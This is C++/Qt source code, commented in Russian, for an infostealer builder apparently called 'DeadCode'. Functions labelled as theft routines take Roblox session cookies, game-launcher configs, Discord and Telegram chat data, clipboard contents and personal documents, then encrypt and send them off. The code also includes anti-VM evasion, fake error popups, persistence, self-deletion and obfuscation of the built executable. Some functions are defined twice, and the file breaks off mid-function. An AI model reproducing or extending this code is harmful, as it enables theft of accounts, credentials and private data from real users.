// Кража данных Epic Games
std::string MainWindow::StealEpicGamesData(const std::string& dir) {
    emitLog("Начало кражи данных Epic Games...");

    std::string epicDir = dir + "\\EpicGamesData";
    std::filesystem::create_directories(epicDir);
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить LOCALAPPDATA");
        free(localAppDataPath);
        return "";
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config";
    if (!std::filesystem::exists(epicPath)) {
        emitLog("Директория Epic Games не найдена");
        return "";
    }

    std::string destEpicDir = epicDir + "\\Config";
    std::filesystem::create_directories(destEpicDir);
    for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath)) {
        if (entry.path().extension() == ".ini") {
            std::string relativePath = std::filesystem::relative(entry.path(), epicPath).string();
            std::string destFilePath = destEpicDir + "\\" + relativePath;
            std::filesystem::create_directories(std::filesystem::path(destFilePath).parent_path());
            std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
            QMutexLocker locker(&filesMutex);
            collectedFiles.push_back(destFilePath);
            result += "Config File: " + destFilePath + "\n";
        }
    }
    emitLog("Кража данных Epic Games завершена");
    return result;
}

// Кража данных Roblox
std::string MainWindow::StealRobloxData(const std::string& dir) {
    emitLog("Начало кражи данных Roblox...");

    std::string robloxDir = dir + "\\RobloxData";
    std::filesystem::create_directories(robloxDir);
    std::string browserData = stealBrowserData(dir);

    std::string cookiesPath = robloxDir + "\\roblox_cookies.txt";
    std::ofstream outFile(cookiesPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для Roblox");
        return "";
    }

    std::string cookies;
    std::regex robloxCookieRegex("(.ROBLOSECURITY=.*?);");
    std::smatch match;
    std::string::const_iterator searchStart(browserData.cbegin());
    while (std::regex_search(searchStart, browserData.cend(), match, robloxCookieRegex)) {
        cookies += "Cookie: " + match[1].str() + "\n";
        searchStart = match.suffix().first;
    }

    if (!cookies.empty()) {
        outFile << cookies;
        outFile.close();
        QMutexLocker locker(&filesMutex);
        collectedFiles.push_back(cookiesPath);
        emitLog("Куки Roblox сохранены: " + QString::fromStdString(cookiesPath));
        return cookies;
    } else {
        outFile.close();
        std::filesystem::remove(cookiesPath);
        emitLog("Куки Roblox не найдены");
        return "";
    }
}

// Кража данных Battle.net
std::string MainWindow::StealBattleNetData(const std::string& dir) {
    emitLog("Начало кражи данных Battle.net...");

    std::string battleNetDir = dir + "\\BattleNetData";
    std::filesystem::create_directories(battleNetDir);
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить LOCALAPPDATA");
        free(localAppDataPath);
        return "";
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string battleNetPath = localAppData + "\\Battle.net";
    if (!std::filesystem::exists(battleNetPath)) {
        emitLog("Директория Battle.net не найдена");
        return "";
    }

    std::string destBattleNetDir = battleNetDir + "\\Config";
    std::filesystem::create_directories(destBattleNetDir);
    for (const auto& entry : std::filesystem::recursive_directory_iterator(battleNetPath)) {
        if (entry.path().extension() == ".config" || entry.path().filename() == "Battle.net.config") {
            std::string relativePath = std::filesystem::relative(entry.path(), battleNetPath).string();
            std::string destFilePath = destBattleNetDir + "\\" + relativePath;
            std::filesystem::create_directories(std::filesystem::path(destFilePath).parent_path());
            std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
            QMutexLocker locker(&filesMutex);
            collectedFiles.push_back(destFilePath);
            result += "Config File: " + destFilePath + "\n";
        }
    }
    emitLog("Кража данных Battle.net завершена");
    return result;
}

// Кража данных Minecraft
std::string MainWindow::StealMinecraftData(const std::string& dir) {
    emitLog("Начало кражи данных Minecraft...");

    std::string minecraftDir = dir + "\\MinecraftData";
    std::filesystem::create_directories(minecraftDir);
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить APPDATA");
        free(appDataPath);
        return "";
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft";
    if (!std::filesystem::exists(minecraftPath)) {
        emitLog("Директория Minecraft не найдена");
        return "";
    }

    std::string profilesPath = minecraftPath + "\\launcher_profiles.json";
    if (std::filesystem::exists(profilesPath)) {
        std::string destProfilesPath = minecraftDir + "\\launcher_profiles.json";
        std::filesystem::copy_file(profilesPath, destProfilesPath, std::filesystem::copy_options::overwrite_existing);
        QMutexLocker locker(&filesMutex);
        collectedFiles.push_back(destProfilesPath);
        result += "Profiles: " + destProfilesPath + "\n";
    }

    std::string modsPath = minecraftPath + "\\mods";
    if (std::filesystem::exists(modsPath)) {
        std::string destModsDir = minecraftDir + "\\mods";
        std::filesystem::create_directories(destModsDir);
        for (const auto& entry : std::filesystem::directory_iterator(modsPath)) {
            if (entry.path().extension() == ".jar") {
                std::string destFilePath = destModsDir + "\\" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                QMutexLocker locker(&filesMutex);
                collectedFiles.push_back(destFilePath);
                result += "Mod: " + destFilePath + "\n";
            }
        }
    }
    emitLog("Кража данных Minecraft завершена");
    return result;
}

// Граббинг файлов
std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
    emitLog("Начало граббинга файлов...");

    std::string grabDir = dir + "\\GrabbedFiles";
    std::filesystem::create_directories(grabDir);
    std::vector<std::string> grabbedFiles;

    char* userProfilePath = nullptr;
    size_t len;
    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
        emitLog("Ошибка: Не удалось получить USERPROFILE");
        free(userProfilePath);
        return {};
    }
    std::string userProfile(userProfilePath);
    free(userProfilePath);

    std::vector<std::string> targetDirs = {
        userProfile + "\\Desktop",
        userProfile + "\\Documents",
        userProfile + "\\Downloads"
    };
    std::vector<std::string> targetExtensions = {".txt", ".docx", ".pdf", ".jpg", ".png"};

    for (const auto& targetDir : targetDirs) {
        if (!std::filesystem::exists(targetDir)) continue;
        for (const auto& entry : std::filesystem::recursive_directory_iterator(targetDir)) {
            if (entry.is_regular_file()) {
                auto ext = entry.path().extension().string();
                if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
                    std::string destFilePath = grabDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    QMutexLocker locker(&filesMutex);
                    grabbedFiles.push_back(destFilePath);
                    emitLog("Файл скопирован: " + QString::fromStdString(destFilePath));
                }
            }
        }
    }
    emitLog("Граббинг файлов завершён");
    return grabbedFiles;
}

// Кража истории чатов
std::string MainWindow::stealChatHistory(const std::string& dir) {
    emitLog("Начало кражи истории чатов...");

    std::string chatDir = dir + "\\ChatHistory";
    std::filesystem::create_directories(chatDir);
    std::string result;

    if (config.discord) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить APPDATA для Discord");
            free(appDataPath);
        } else {
            std::string appData(appDataPath);
            free(appDataPath);
            std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
            if (std::filesystem::exists(discordPath)) {
                std::string messagesPath = chatDir + "\\discord_messages.txt";
                std::ofstream outFile(messagesPath);
                if (outFile.is_open()) {
                    std::string messages;
                    for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                        if (entry.path().extension() == ".ldb") {
                            std::ifstream file(entry.path(), std::ios::binary);
                            if (file.is_open()) {
                                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                                file.close();
                                std::regex messageRegex("\"content\":\"([^\"]+)\",\"timestamp\":\"([^\"]+)\"");
                                std::smatch match;
                                std::string::const_iterator searchStart(content.cbegin());
                                while (std::regex_search(searchStart, content.cend(), match, messageRegex)) {
                                    messages += "Message: " + match[1].str() + "\nTimestamp: " + match[2].str() + "\n\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                    }
                    if (!messages.empty()) {
                        outFile << messages;
                        outFile.close();
                        QMutexLocker locker(&filesMutex);
                        collectedFiles.push_back(messagesPath);
                        result += "Discord Messages: " + messagesPath + "\n";
                        emitLog("Сообщения Discord сохранены: " + QString::fromStdString(messagesPath));
                    } else {
                        outFile.close();
                        std::filesystem::remove(messagesPath);
                    }
                }
            }
        }
    }

    if (config.telegram) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить APPDATA для Telegram");
            free(appDataPath);
        } else {
            std::string appData(appDataPath);
            free(appDataPath);
            std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
            if (std::filesystem::exists(telegramPath)) {
                std::string chatDataPath = chatDir + "\\telegram_chat_data.txt";
                std::ofstream outFile(chatDataPath);
                if (outFile.is_open()) {
                    std::string chatData;
                    std::vector<std::string> telegramFiles;
                    for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                        std::string filename = entry.path().filename().string();
                        if (filename.find("chat_") != std::string::npos) {
                            std::string outPath = chatDir + "\\telegram_" + filename;
                            std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                            QMutexLocker locker(&filesMutex);
                            collectedFiles.push_back(outPath);
                            telegramFiles.push_back(outPath);
                            result += "Telegram File: " + outPath + "\n";
                        }
                    }
                    for (const auto& filePath : telegramFiles) {
                        std::ifstream file(filePath, std::ios::binary);
                        if (file.is_open()) {
                            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                            file.close();
                            std::regex textRegex("[\\w\\s\\p{P}]{10,}");
                            std::smatch match;
                            std::string::const_iterator searchStart(content.cbegin());
                            while (std::regex_search(searchStart, content.cend(), match, textRegex)) {
                                chatData += "Possible Message: " + match[0].str() + "\n";
                                searchStart = match.suffix().first;
                            }
                        }
                    }
                    if (!chatData.empty()) {
                        outFile << chatData;
                        outFile.close();
                        QMutexLocker locker(&filesMutex);
                        collectedFiles.push_back(chatDataPath);
                        result += "Telegram Chat Data: " + chatDataPath + "\n";
                        emitLog("Данные чатов Telegram сохранены: " + QString::fromStdString(chatDataPath));
                    } else {
                        outFile.close();
                        std::filesystem::remove(chatDataPath);
                    }
                }
            }
        }
    }
    emitLog("Кража истории чатов завершена");
    return result;
}

// Сбор данных для социальной инженерии (новая функция)
std::string MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    std::string seDir = dir + "\\SocialEngineering";
    std::filesystem::create_directories(seDir);
    std::string result;

    // Собираем данные из буфера обмена
    if (QGuiApplication::clipboard()) {
        std::string clipboardPath = seDir + "\\clipboard.txt";
        std::ofstream clipFile(clipboardPath);
        if (clipFile.is_open()) {
            QString clipboardText = QGuiApplication::clipboard()->text();
            if (!clipboardText.isEmpty()) {
                clipFile << "Clipboard: " << clipboardText.toStdString() << "\n";
                clipFile.close();
                QMutexLocker locker(&filesMutex);
                collectedFiles.push_back(clipboardPath);
                result += "Clipboard: " + clipboardPath + "\n";
                emitLog("Данные буфера обмена сохранены: " + QString::fromStdString(clipboardPath));
            } else {
                clipFile.close();
                std::filesystem::remove(clipboardPath);
            }
        }
    }

    // Собираем последние открытые файлы из реестра
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        std::string recentPath = seDir + "\\recent_files.txt";
        std::ofstream recentFile(recentPath);
        if (recentFile.is_open()) {
            char valueName[256];
            DWORD valueNameSize = sizeof(valueName);
            BYTE data[1024];
            DWORD dataSize = sizeof(data);
            DWORD type;
            DWORD index = 0;

            while (RegEnumValueA(hKey, index++, valueName, &valueNameSize, nullptr, &type, data, &dataSize) == ERROR_SUCCESS) {
                if (type == REG_SZ) {
                    recentFile << "Recent File: " << reinterpret_cast<char*>(data) << "\n";
                }
                valueNameSize = sizeof(valueName);
                dataSize = sizeof(data);
            }
            recentFile.close();
            if (std::filesystem::file_size(recentPath) > 0) {
                QMutexLocker locker(&filesMutex);
                collectedFiles.push_back(recentPath);
                result += "Recent Files: " + recentPath + "\n";
                emitLog("Список последних файлов сохранён: " + QString::fromStdString(recentPath));
            } else {
                std::filesystem::remove(recentPath);
            }
        }
        RegCloseKey(hKey);
    }

    emitLog("Сбор данных для социальной инженерии завершён");
    return result;
}

// Основная функция кражи и отправки данных
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Запуск процесса кражи и отправки данных...");

    std::filesystem::create_directories(tempDir);
    std::string collectedData;

    if (config.antiVM && isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина, завершение работы...");
        if (config.fakeError) {
            MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Critical Error", MB_ICONERROR);
        }
        return;
    }

    if (config.systemInfo) collectedData += collectSystemInfo(tempDir) + "\n";
    if (config.screenshot) collectedData += TakeScreenshot(tempDir) + "\n";
    if (config.cookies || config.passwords) collectedData += stealBrowserData(tempDir) + "\n";
    if (config.discord) collectedData += StealDiscordTokens(tempDir) + "\n";
    if (config.telegram) collectedData += StealTelegramData(tempDir) + "\n";
    if (config.steam) collectedData += StealSteamData(tempDir) + "\n";
    if (config.epic) collectedData += StealEpicGamesData(tempDir) + "\n";
    if (config.roblox) collectedData += StealRobloxData(tempDir) + "\n";
    if (config.battlenet) collectedData += StealBattleNetData(tempDir) + "\n";
    if (config.minecraft) collectedData += StealMinecraftData(tempDir) + "\n";
    if (config.fileGrabber) {
        std::vector<std::string> grabbedFiles = GrabFiles(tempDir);
        QMutexLocker locker(&filesMutex);
        collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
    }
    if (config.chatHistory) collectedData += stealChatHistory(tempDir) + "\n";
    if (config.socialEngineering) collectedData += collectSocialEngineeringData(tempDir) + "\n";

    if (collectedData.empty() && collectedFiles.empty()) {
        emitLog("Нет данных для отправки");
        std::filesystem::remove_all(tempDir);
        return;
    }

    std::string encryptedData = encryptData(collectedData);
    if (!encryptedData.empty()) {
        QMutexLocker locker(&filesMutex);
        sendData(QString::fromStdString(encryptedData), collectedFiles);
    }

    std::filesystem::remove_all(tempDir);
    emitLog("Процесс кражи и отправки данных завершён");

    if (config.selfDestruct) {
        emitLog("Запуск самоуничтожения...");
        char exePath[MAX_PATH];
        GetModuleFileNameA(nullptr, exePath, MAX_PATH);
        std::string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + std::string(exePath) + "\"";
        system(cmd.c_str());
    }
}

// Реализация StealerWorker
StealerWorker::StealerWorker(MainWindow* window, const std::string& tempDir)
    : window(window), tempDir(tempDir) {}

void StealerWorker::process() {
    window->StealAndSendData(tempDir);
    emit finished();
}

// Начало процесса кражи в отдельном потоке
void MainWindow::startStealProcess() {
    QString tempDir = QString::fromStdString("temp_" + generateRandomString(8));
    QThread* thread = new QThread(this);
    StealerWorker* worker = new StealerWorker(this, tempDir.toStdString());
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
    emitLog("Процесс кражи запущен в отдельном потоке с временной директорией: " + tempDir);
}

// Сбор данных для социальной инженерии (потокобезопасно)
std::string MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    std::string seDir = dir + "\\SocialEngineering";
    try {
        std::filesystem::create_directories(seDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для социальной инженерии: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string seDataPath = seDir + "\\social_engineering.txt";
    std::ofstream outFile(seDataPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для социальной инженерии");
        return "";
    }

    std::string seData;

    // Получение имени пользователя
    char username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    if (GetUserNameA(username, &usernameLen)) {
        seData += "Username: " + std::string(username) + "\n";
    } else {
        emitLog("Ошибка получения имени пользователя: " + QString::number(GetLastError()));
    }

    // Получение списка установленных программ
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        seData += "\nInstalled Programs:\n";
        DWORD index = 0;
        char subKeyName[255];
        DWORD subKeyNameLen = 255;
        while (RegEnumKeyExA(hKey, index, subKeyName, &subKeyNameLen, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            HKEY subKey;
            if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &subKey) == ERROR_SUCCESS) {
                char displayName[255];
                DWORD displayNameLen = sizeof(displayName);
                if (RegQueryValueExA(subKey, "DisplayName", nullptr, nullptr, (LPBYTE)displayName, &displayNameLen) == ERROR_SUCCESS) {
                    seData += "- " + std::string(displayName) + "\n";
                }
                RegCloseKey(subKey);
            }
            index++;
            subKeyNameLen = 255;
        }
        RegCloseKey(hKey);
    } else {
        emitLog("Ошибка открытия реестра для списка программ");
    }

    // Получение недавних файлов
    char* userProfilePath = nullptr;
    size_t len;
    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
        emitLog("Ошибка получения USERPROFILE для недавних файлов");
        free(userProfilePath);
    } else {
        std::string recentPath = std::string(userProfilePath) + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent";
        free(userProfilePath);
        if (std::filesystem::exists(recentPath)) {
            seData += "\nRecent Files:\n";
            try {
                for (const auto& entry : std::filesystem::directory_iterator(recentPath)) {
                    if (entry.path().extension() == ".lnk") {
                        seData += "- " + entry.path().filename().string() + "\n";
                    }
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка получения недавних файлов: " + QString::fromStdString(e.what()));
            }
        }
    }

    // Получение данных из буфера обмена
    if (OpenClipboard(nullptr)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* clipboardText = static_cast<char*>(GlobalLock(hData));
            if (clipboardText) {
                seData += "\nClipboard Data:\n" + std::string(clipboardText) + "\n";
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    } else {
        emitLog("Ошибка доступа к буферу обмена");
    }

    outFile << seData;
    outFile.close();
    emitLog("Данные социальной инженерии сохранены: " + QString::fromStdString(seDataPath));
    QMutexLocker locker(&filesMutex);
    collectedFiles.push_back(seDataPath);
    return seData;
}

// Основной метод кражи и отправки данных (потокобезопасно)
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Запуск процесса кражи и отправки данных...");

    // Настройка персистентности
    setupPersistence();

    QMutexLocker locker(&filesMutex);
    collectedFiles.clear();
    collectedData.clear();
    locker.unlock();

    if (config.antiVM && isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина. Прерывание выполнения.");
        if (config.fakeError) {
            MessageBoxA(nullptr, "Application has encountered a critical error and needs to close.", "Error", MB_ICONERROR | MB_OK);
        }
        return;
    }

    if (config.fakeError) {
        MessageBoxA(nullptr, "Application has encountered a critical error and needs to close.", "Error", MB_ICONERROR | MB_OK);
    }

    try {
        std::filesystem::create_directories(tempDir);
        emitLog("Временная директория создана: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка создания временной директории: " + QString::fromStdString(e.what()));
        return;
    }

    // Сбор данных
    if (config.systemInfo) {
        std::string sysInfo = collectSystemInfo(tempDir);
        if (!sysInfo.empty()) {
            locker.relock();
            collectedData += "System Info:\n" + sysInfo + "\n";
            locker.unlock();
        }
    }

    if (config.screenshot) {
        std::string screenshotPath = TakeScreenshot(tempDir);
        if (!screenshotPath.empty()) {
            locker.relock();
            collectedData += "Screenshot:\n" + screenshotPath + "\n";
            locker.unlock();
        }
    }

    if (config.cookies || config.passwords) {
        std::string browserData = stealBrowserData(tempDir);
        if (!browserData.empty()) {
            locker.relock();
            collectedData += "Browser Data:\n" + browserData + "\n";
            locker.unlock();
        }
    }

    if (config.discord) {
        std::string discordTokens = StealDiscordTokens(tempDir);
        if (!discordTokens.empty()) {
            locker.relock();
            collectedData += "Discord Tokens:\n" + discordTokens + "\n";
            locker.unlock();
        }
    }

    if (config.telegram) {
        std::string telegramData = StealTelegramData(tempDir);
        if (!telegramData.empty()) {
            locker.relock();
            collectedData += "Telegram Data:\n" + telegramData + "\n";
            locker.unlock();
        }
    }

    if (config.steam) {
        std::string steamData = StealSteamData(tempDir);
        if (!steamData.empty()) {
            locker.relock();
            collectedData += "Steam Data:\n" + steamData + "\n";
            locker.unlock();
        }
    }

    if (config.epic) {
        std::string epicData = StealEpicGamesData(tempDir);
        if (!epicData.empty()) {
            locker.relock();
            collectedData += "Epic Games Data:\n" + epicData + "\n";
            locker.unlock();
        }
    }

    if (config.roblox) {
        std::string robloxData = StealRobloxData(tempDir);
        if (!robloxData.empty()) {
            locker.relock();
            collectedData += "Roblox Data:\n" + robloxData + "\n";
            locker.unlock();
        }
    }

    if (config.battlenet) {
        std::string battleNetData = StealBattleNetData(tempDir);
        if (!battleNetData.empty()) {
            locker.relock();
            collectedData += "Battle.net Data:\n" + battleNetData + "\n";
            locker.unlock();
        }
    }

    if (config.minecraft) {
        std::string minecraftData = StealMinecraftData(tempDir);
        if (!minecraftData.empty()) {
            locker.relock();
            collectedData += "Minecraft Data:\n" + minecraftData + "\n";
            locker.unlock();
        }
    }

    if (config.fileGrabber) {
        std::vector<std::string> grabbedFiles = GrabFiles(tempDir);
        if (!grabbedFiles.empty()) {
            locker.relock();
            collectedData += "Grabbed Files:\n";
            for (const auto& file : grabbedFiles) {
                collectedData += file + "\n";
            }
            locker.unlock();
        }
    }

    if (config.chatHistory) {
        std::string chatHistory = stealChatHistory(tempDir);
        if (!chatHistory.empty()) {
            locker.relock();
            collectedData += "Chat History:\n" + chatHistory + "\n";
            locker.unlock();
        }
    }

    if (config.socialEngineering) {
        std::string seData = collectSocialEngineeringData(tempDir);
        if (!seData.empty()) {
            locker.relock();
            collectedData += "Social Engineering Data:\n" + seData + "\n";
            locker.unlock();
        }
    }

    locker.relock();
    if (!collectedData.empty() || !collectedFiles.empty()) {
        emitLog("Собрано данных: " + QString::number(collectedData.size()) + " байт, файлов: " + QString::number(collectedFiles.size()));

        std::string zipPath;
        if (!collectedFiles.empty()) {
            zipPath = archiveData(tempDir, collectedFiles);
            if (zipPath.empty()) {
                emitLog("Ошибка создания ZIP-архива");
                std::filesystem::remove_all(tempDir);
                return;
            }
            collectedFiles.clear();
            collectedFiles.push_back(zipPath);
        }

        std::string encryptedData = encryptData(collectedData);
        locker.unlock();

        if (!encryptedData.empty()) {
            emitLog("Данные зашифрованы, размер: " + QString::number(encryptedData.size()) + " байт");

            std::string encryptedDataPath = tempDir + "\\encrypted_data.bin";
            std::ofstream encryptedFile(encryptedDataPath, std::ios::binary);
            if (encryptedFile.is_open()) {
                encryptedFile.write(encryptedData.data(), encryptedData.size());
                encryptedFile.close();
                locker.relock();
                collectedFiles.push_back(encryptedDataPath);
                locker.unlock();
                emitLog("Зашифрованные данные сохранены: " + QString::fromStdString(encryptedDataPath));
                sendData(QString::fromStdString(encryptedData), collectedFiles);
            } else {
                emitLog("Ошибка сохранения зашифрованных данных");
            }
        } else {
            emitLog("Ошибка шифрования данных");
        }
    } else {
        emitLog("Нет данных для отправки");
    }
    locker.unlock();

    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

    if (config.selfDestruct) {
        emitLog("Запуск самоуничтожения...");
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string batchFile = "self_destruct.bat";
        std::ofstream batFile(batchFile);
        if (batFile.is_open()) {
            batFile << "@echo off\n";
            batFile << "timeout /t 2 /nobreak >nul\n";
            batFile << "del \"" << exePath << "\"\n";
            batFile << "del \"%~f0\"\n";
            batFile.close();
            system(("start /min " + batchFile).c_str());
        }
        QApplication::quit();
    }

    emitLog("Процесс кражи и отправки завершён");
}

// Запуск GitHub Actions Workflow
void MainWindow::triggerGitHubActions() {
    emitLog("Запуск GitHub Actions Workflow...");

    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches";
    QNetworkRequest request(QUrl(url));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";

    QJsonDocument doc(json);
    QByteArray data = doc.toJson();

    QNetworkReply* reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка запуска GitHub Actions: " + reply->errorString());
            isBuilding = false;
        } else {
            emitLog("GitHub Actions Workflow запущен");
            statusCheckTimer->start(30000);
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки в GitHub Actions
void MainWindow::checkBuildStatus() {
    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs";
    QNetworkRequest request(QUrl(url));
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка проверки статуса: " + reply->errorString());
            statusCheckTimer->stop();
            isBuilding = false;
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QJsonArray runs = obj["workflow_runs"].toArray();
            if (runs.isEmpty()) {
                emitLog("Активные запуски GitHub Actions не найдены");
                return;
            }

            QJsonObject latestRun = runs[0].toObject();
            QString status = latestRun["status"].toString();
            QString conclusion = latestRun["conclusion"].toString();
            runId = latestRun["id"].toInt();

            emitLog("Статус сборки: " + status + ", Заключение: " + (conclusion.isEmpty() ? "в процессе" : conclusion));

            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка завершена, загрузка артефактов...");
                    downloadArtifacts();
                } else {
                    emitLog("Сборка завершилась с ошибкой: " + conclusion);
                    isBuilding = false;
                }
            }
        }
        reply->deleteLater();
    });
}

// Загрузка артефактов из GitHub Actions
void MainWindow::downloadArtifacts() {
    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs/" + QString::number(runId) + "/artifacts";
    QNetworkRequest request(QUrl(url));
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка получения артефактов: " + reply->errorString());
            isBuilding = false;
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QJsonArray artifacts = obj["artifacts"].toArray();
            if (artifacts.isEmpty()) {
                emitLog("Артефакты не найдены");
                isBuilding = false;
                return;
            }

            QJsonObject artifact = artifacts[0].toObject();
            QString downloadUrl = artifact["archive_download_url"].toString();
            artifactId = artifact["id"].toInt();

            QNetworkRequest downloadRequest(QUrl(downloadUrl));
            downloadRequest.setRawHeader("Authorization", ("Bearer " + githubTokenLineEdit->text()).toUtf8());
            downloadRequest.setRawHeader("Accept", "application/vnd.github.v3+json");

            QNetworkReply* downloadReply = manager->get(downloadRequest);
            connect(downloadReply, &QNetworkReply::finished, this, [this, downloadReply]() {
                if (downloadReply->error() != QNetworkReply::NoError) {
                    emitLog("Ошибка загрузки артефакта: " + downloadReply->errorString());
                } else {
                    QByteArray data = downloadReply->readAll();
                    QString outputFile = QString::fromStdString(config.filename.empty() ? "DeadCode.exe" : config.filename);
                    QFile file(outputFile);
                    if (file.open(QIODevice::WriteOnly)) {
                        file.write(data);
                        file.close();
                        emitLog("Артефакт загружен: " + outputFile);

                        std::string exePath = outputFile.toStdString();
                        obfuscateExecutable(exePath);
                        applyPolymorphicObfuscation(exePath);

                        if (config.silent) {
                            emitLog("Запуск кражи данных в фоновом режиме...");
                            emit startStealSignal();
